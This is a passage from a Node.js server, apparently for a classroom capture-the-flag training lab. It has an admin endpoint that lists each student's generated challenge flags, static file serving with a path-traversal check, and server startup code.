    if(req.method==='GET'&&url.pathname==='/api/admin/exam-keys'){
      const studentKeys=Object.keys(db.users).map(sName=>({
        name: sName,
        kelas: db.users[sName].kelas||'TJKT',
        flags: allChalls.map(c=>({
          id: c.id,
          title: c.title,
          flag: getStudentDynamicFlag(sName, c.id)
        }))
      }));
      return send(res,200,{studentKeys});
    }
  }

  /* ================== STATIC FILES SERVING ================== */
  if(req.method!=='GET') return send(res,405,'Method not allowed','text/plain');
  let p=decodeURIComponent(url.pathname);
  if(p==='/') p='/index.html';
  const full=path.resolve(ROOT,'.'+p);
  if(!full.startsWith(ROOT+path.sep)) return send(res,403,'Forbidden','text/plain');

  fs.readFile(full,(err,data)=>{
    if(err) return send(res,404,'Not found','text/plain');
    const ext=path.extname(full);
    send(res,200,data,({
      '.html':'text/html; charset=utf-8',
      '.css':'text/css; charset=utf-8',
      '.js':'text/javascript; charset=utf-8',
      '.svg':'image/svg+xml'
    }[ext]||'application/octet-stream'));
  });

}catch(e){
  send(res,400,{error:e.message||'Kesalahan permintaan server'});
}
}

// Jalankan server standalone saat dieksekusi langsung di mesin lokal/VPS
if(require.main===module || (!process.env.VERCEL && !process.env.AWS_LAMBDA_FUNCTION_NAME)){
  http.createServer(requestHandler).listen(PORT,'0.0.0.0',()=>console.log(`CyberLab aktif di: http://localhost:${PORT}`));
}

module.exports = requestHandler;
